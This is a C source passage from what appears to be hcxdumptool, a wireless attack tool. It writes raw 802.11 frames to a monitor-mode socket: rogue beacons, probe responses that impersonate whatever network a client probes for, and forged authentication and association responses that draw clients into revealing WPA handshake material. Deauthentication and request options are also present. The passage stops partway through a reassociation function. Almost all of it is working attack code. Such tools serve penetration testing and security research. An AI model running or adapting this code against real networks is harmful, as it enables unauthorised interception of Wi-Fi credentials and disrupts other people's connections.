#define _GNU_SOURCE
#include <ctype.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdbool.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <limits.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <pthread.h>

#ifdef DOGPIOSUPPORT
#include <wiringPi.h>
#endif

#include "include/version.h"
#include "include/wireless-lite.h"
#include "include/hcxdumptool.h"
#include "include/byteops.c"
#include "include/ieee80211.c"
#include "include/pcap.c"
#include "include/strings.c"
#include "include/hashops.c"

#if __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__
#define BIG_ENDIAN_HOST
#endif

#define CHK_ERR(x) if((x)<=0) errorcount++

/*===========================================================================*/
/* global var */

static int fd_socket = 0;
static int fd_pcap = 0;
static int fd_ippcap = 0;

static uint32_t myouiap = 0;
static uint32_t mynicap = 0;
static uint32_t myouista = 0;
static uint32_t mynicsta = 0;
static uint32_t mysequencenr = 0;
static uint64_t mytime = 0;

static int staytime = TIME_INTERVAL;
static uint8_t cpa = 0;

static char *interfacename = NULL;
static char *pcapoutname = NULL;
static char *ippcapoutname = NULL;

static macessidlist_t *macapessidliste = NULL;
static macessidlist_t *macstaessidliste = NULL;
static macessidlist_t *macmyapessidliste = NULL;
static networklist_t *networkliste = NULL;

static int errorcause = EXIT_SUCCESS;
static int errorcount = 0;
static int maxerrorcount = 1000000;

static bool wantstopflag = false;
static bool wantstatusflag = false;
static bool showinterfaces = false;
static bool poweroffflag = false;
static bool channelsetflag = false;
static bool deauthflag = false;
static bool requestflag = false;
static bool respondflag = false;
static bool qosflag = false;


static const uint8_t hdradiotap[] =
{
0x00, 0x00, // <-- radiotap version
0x0c, 0x00, // <- radiotap header length
0x04, 0x80, 0x00, 0x00, // <-- bitmap
0x02, // <-- rate
0x00, // <-- padding for natural alignment
0x18, 0x00, // <-- TX flags
};
#define HDRRT_SIZE sizeof(hdradiotap)

static uint8_t channeldefaultlist[] =
{
1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
34, 36, 38, 40, 42, 44, 46, 48, 52, 56, 58, 60, 62, 64,
100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 147, 149, 151, 153, 155, 157,
161, 165, 167, 169, 184, 188, 192, 196, 200, 204, 208, 212, 216,
0
};

static uint8_t channelscanlist[128] =
{
1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};

static uint8_t mac_mybcap[6];
static uint8_t mac_myap[6];
static uint8_t mac_mysta[6];

struct timeval tv;
struct timeval tvfd;

static pcaprec_hdr_t *pkh;
static uint8_t *packet_ptr;
static mac_t *mac_ptr;
static authf_t* authentication_ptr;
static ietag_t *essid_tag;
static llc_t *llc;
static eapauth_t *eap;
static wpakey_t *wpak;

static actf_t *action_ptr;
static uint8_t *nextmacap;
static uint8_t authenticationflag;

static int caplen;
static uint8_t packetin[PCAP_SNAPLEN +PCAPREC_SIZE];

/*===========================================================================*/
static void printnetwork(char *networkinfo)
{
int p;
char timestring[16];

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
fprintf(stdout, "\33[2K[%s] ", timestring);

for(p = 0; p< 6; p++)
	{
	fprintf(stdout, "%02x", networkliste->mac_ap[p]);
	}
fprintf(stdout, ":");
for(p = 0; p< 6; p++)
	{
	fprintf(stdout, "%02x", networkliste->mac_sta[p]);
	}
fprintf(stdout, ":");
fwrite(networkliste->essid, networkliste->essid_len, 1, stdout);
fprintf(stdout, " %s\n", networkinfo);
return;
}
/*===========================================================================*/
static bool checknetwork_m1org()
{
networklist_t *zeiger;
int c;

zeiger = networkliste;
for(c = 0; c < NETWORKLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_ap, 6) == 0)
		{
		return false;
		}
	if((zeiger->status >= 7) && (memcmp(zeiger->mac_ap, mac_ptr->addr2,  6) == 0) && (memcmp(zeiger->mac_sta, mac_ptr->addr1, 6) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		return true;
		}
	zeiger++;
	}
return false;
}
/*===========================================================================*/
static bool checknetwork_m12()
{
networklist_t *zeiger;
int c;

zeiger = networkliste;
for(c = 0; c < NETWORKLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_ap, 6) == 0)
		{
		return false;
		}
	if((zeiger->status >= 7) && (memcmp(zeiger->mac_ap, mac_ptr->addr1,  6) == 0) && (memcmp(zeiger->mac_sta, mac_ptr->addr2, 6) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		return true;
		}
	zeiger++;
	}
return false;
}
/*===========================================================================*/
static bool checknetwork_broadcast()
{
networklist_t *zeiger;
int c;

zeiger = networkliste;
for(c = 0; c < NETWORKLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_ap, 6) == 0)
		{
		return false;
		}
	if((zeiger->status >= 7) && (memcmp(zeiger->mac_ap, mac_ptr->addr2,  6) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		return true;
		}
	zeiger++;
	}
return false;
}
/*===========================================================================*/
static void send_broadcastbeacon()
{
int retw;
mac_t *macf;
capap_t *capap;

const uint8_t broadcastbeacondata[] =
{
0x00, 0x00,
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
0x03, 0x01, 0x0d,
0x05, 0x04, 0x00, 0x01, 0x00, 0x00,
0x2a, 0x01, 0x00,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xef, 0x11, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00, 
0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01, 0x20
};
#define BROADCASTBEACON_SIZE sizeof(broadcastbeacondata)

uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BROADCASTBEACON_SIZE +1];

if(requestflag == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BROADCASTBEACON_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_BEACON;
memcpy(macf->addr1, &mac_broadcast, 6);
memcpy(macf->addr2, &mac_mybcap, 6);
memcpy(macf->addr3, &mac_mybcap, 6);
macf->sequence = mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
capap = (capap_t*)(packetout +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0x64;
capap->capapinfo = 0x431;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE], &broadcastbeacondata, BROADCASTBEACON_SIZE);
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +0x0e] = channelscanlist[cpa];
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +BROADCASTBEACON_SIZE));
return;
}
/*===========================================================================*/
static void send_undirected_proberequest()
{
int retw;
mac_t *macf;

const uint8_t undirectedproberequestdata[] =
{
0x00, 0x00, 0x01, 0x04, 0x02, 0x04, 0x0b, 0x16,
0x32, 0x08, 0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c,
0x03, 0x01, 0x02,
0x2d, 0x1a, 0x2c, 0x01, 0x03, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x08, 0x00, 0x00, 0x00
};
#define UNDIRECTEDPROBEREQUEST_SIZE sizeof(undirectedproberequestdata)

static uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE +1];

if(requestflag == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_PROBE_REQ;
memcpy(macf->addr1, &mac_broadcast, 6);
memcpy(macf->addr2, &mac_mysta, 6);
memcpy(macf->addr3, &mac_broadcast, 6);
macf->sequence = mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &undirectedproberequestdata, UNDIRECTEDPROBEREQUEST_SIZE);
packetout[HDRRT_SIZE +MAC_SIZE_NORM +0x14] = channelscanlist[cpa];
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +UNDIRECTEDPROBEREQUEST_SIZE));
return;
}
/*===========================================================================*/
static void send_acknowledgement()
{
int retw;
mac_t *macf;
uint8_t packetout[HDRRT_SIZE +MAC_SIZE_ACK +1];

if(respondflag == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_ACK +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_CTL;
macf->subtype = IEEE80211_STYPE_ACK;
macf->duration = 0x013a;
memcpy(macf->addr1, mac_ptr->addr2, 6);
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_ACK));
return;
}
/*===========================================================================*/
static void send_action_rmr()
{
static int retw;
static mac_t *macf;

static const uint8_t actionrmrdata[] =
{
0x05, 0x00, 0x01, 0x00, 0x00, 0x26, 0x14, 0x00,
0x00, 0x05, 0x20, 0xff, 0x00, 0x00, 0x0a, 0x00,
0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe,
0x00, 0x00, 0x00
};
#define ACTIONRMR_SIZE sizeof(actionrmrdata)

static uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM + ACTIONRMR_SIZE +1];

memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM + ACTIONRMR_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_ACTION;
memcpy(macf->addr1, networkliste->mac_sta, 6);
memcpy(macf->addr2, networkliste->mac_ap, 6);
memcpy(macf->addr3, networkliste->mac_ap, 6);
macf->duration = 0x013a;
macf->sequence = mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &actionrmrdata, ACTIONRMR_SIZE);
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM + ACTIONRMR_SIZE));
return;
}
/*===========================================================================*/
static void send_directproberesponse()
{
static int retw;
static mac_t *macf;
static capap_t *capap;

const uint8_t proberesponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
0x03, 0x01, 0x0d,
0x2a, 0x01, 0x00,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x6f, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
0x10, 0x3b, 0x00, 0x01, 0x03, 0x10, 0x47, 0x00, 0x10, 0x44, 0xdd, 0xae, 0xe5, 0xe3, 0xbd, 0x75,
0x0d, 0x42, 0xa8, 0x08, 0x96, 0xd7, 0x98, 0xe1, 0x9e, 0x10, 0x21, 0x00, 0x03, 0x41, 0x56, 0x4d,
0x10, 0x23, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x24, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30,
0x10, 0x42, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30, 0x10, 0x54, 0x00, 0x08, 0x00, 0x06, 0x00, 0x50,
0xf2, 0x04, 0x00, 0x01, 0x10, 0x11, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x08, 0x00, 0x02,
0x23, 0x88, 0x10, 0x3c, 0x00, 0x01, 0x01, 0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01,
0x20
};
#define PROBERESPONSE_SIZE sizeof(proberesponsedata)

static uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +32 +PROBERESPONSE_SIZE];

if(respondflag == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +32 +PROBERESPONSE_SIZE);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macf->addr1, mac_ptr->addr2, 6);
memcpy(macf->addr2, mac_ptr->addr1, 6);
memcpy(macf->addr3, mac_ptr->addr1, 6);
macf->sequence = mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
capap = (capap_t*)(packetout +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime;
capap->beaconintervall = 0x64;
capap->capapinfo = 0x431;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = essid_tag->len;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2], essid_tag->data, essid_tag->len);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +essid_tag->len], &proberesponsedata, PROBERESPONSE_SIZE);
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +essid_tag->len +0x0c] = channelscanlist[cpa];
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +essid_tag->len +PROBERESPONSE_SIZE));
return;
}
/*===========================================================================*/
static void send_nextdirectproberesponse()
{
static int retw;
static mac_t *macf;
static capap_t *capap;

const uint8_t proberesponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
0x03, 0x01, 0x0d,
0x2a, 0x01, 0x00,
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00,
0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01, 0x01, 0x00, 0x00, 0xff, 0x7f,
0xdd, 0x0c, 0x00, 0x04, 0x0e, 0x01, 0x01, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, 0x00, 0x00,
0xdd, 0x6f, 0x00, 0x50, 0xf2, 0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44, 0x00, 0x01, 0x02,
0x10, 0x3b, 0x00, 0x01, 0x03, 0x10, 0x47, 0x00, 0x10, 0x44, 0xdd, 0xae, 0xe5, 0xe3, 0xbd, 0x75,
0x0d, 0x42, 0xa8, 0x08, 0x96, 0xd7, 0x98, 0xe1, 0x9e, 0x10, 0x21, 0x00, 0x03, 0x41, 0x56, 0x4d,
0x10, 0x23, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x24, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30,
0x10, 0x42, 0x00, 0x04, 0x30, 0x30, 0x30, 0x30, 0x10, 0x54, 0x00, 0x08, 0x00, 0x06, 0x00, 0x50,
0xf2, 0x04, 0x00, 0x01, 0x10, 0x11, 0x00, 0x04, 0x46, 0x42, 0x6f, 0x78, 0x10, 0x08, 0x00, 0x02,
0x23, 0x88, 0x10, 0x3c, 0x00, 0x01, 0x01, 0x10, 0x49, 0x00, 0x06, 0x00, 0x37, 0x2a, 0x00, 0x01,
0x20
};
#define PROBERESPONSE_SIZE sizeof(proberesponsedata)

static uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +32 +PROBERESPONSE_SIZE];

if(respondflag == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +32 +PROBERESPONSE_SIZE);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macf->addr1, mac_ptr->addr2, 6);
memcpy(macf->addr2, nextmacap, 6);
memcpy(macf->addr3, nextmacap, 6);
macf->sequence = mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
capap = (capap_t*)(packetout +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime;
capap->beaconintervall = 0x64;
capap->capapinfo = 0x431;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = essid_tag->len;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2], essid_tag->data, essid_tag->len);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +essid_tag->len], &proberesponsedata, PROBERESPONSE_SIZE);
packetout[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +essid_tag->len +0x0c] = channelscanlist[cpa];
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +2 +essid_tag->len +PROBERESPONSE_SIZE));
return;
}
/*===========================================================================*/
static void send_authenticationresponse()
{
int retw;
mac_t *macf;

const uint8_t authenticationresponsedata[] =
{
0x00, 0x00, 0x02, 0x00, 0x00, 0x00
};
#define MYAUTHENTICATIONRESPONSE_SIZE sizeof(authenticationresponsedata)

uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONRESPONSE_SIZE +1];

if(respondflag == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONRESPONSE_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_AUTH;
memcpy(macf->addr1, mac_ptr->addr2, 6);
memcpy(macf->addr2, mac_ptr->addr1, 6);
memcpy(macf->addr3, mac_ptr->addr1, 6);
macf->duration = 0x013a;
macf->sequence = mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationresponsedata, MYAUTHENTICATIONRESPONSE_SIZE);
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONRESPONSE_SIZE));
return;
}
/*===========================================================================*/
static void send_associationresponse()
{
static int retw;
static mac_t *macf;

static const uint8_t associationresponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0d, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

static const uint8_t associationid[] =
{
0x31, 0x04, 0x00, 0x00, 0x00, 0xc0
};
#define ASSOCIATIONID_SIZE sizeof(associationid)

static uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE +1];

if(respondflag == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_ASSOC_RESP;
memcpy(macf->addr1, mac_ptr->addr2, 6);
memcpy(macf->addr2, mac_ptr->addr1, 6);
memcpy(macf->addr3, mac_ptr->addr1, 6);
macf->duration = 0x013a;
macf->sequence =mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &associationid, ASSOCIATIONID_SIZE);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE));
return;
}
/*===========================================================================*/
static void send_reassociationresponse()
{
static int retw;
static mac_t *macf;

static const uint8_t associationresponsedata[] =
{
0x01, 0x08, 0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24,
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
0x2d, 0x1a, 0xaf, 0x01, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x04, 0x06, 0xe6, 0x47, 0x0d, 0x00,
0x3d, 0x16, 0x0b, 0x0f, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4a, 0x0e, 0x14, 0x00, 0x0a, 0x00, 0x2c, 0x01, 0xc8, 0x00, 0x14, 0x00, 0x05, 0x00, 0x19, 0x00,
0x7f, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x00, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32, 0x2f, 0x00
};
#define ASSOCIATIONRESPONSE_SIZE sizeof(associationresponsedata)

static const uint8_t associationid[] =
{
0x31, 0x04, 0x00, 0x00, 0x01, 0xc0
};
#define ASSOCIATIONID_SIZE sizeof(associationid)

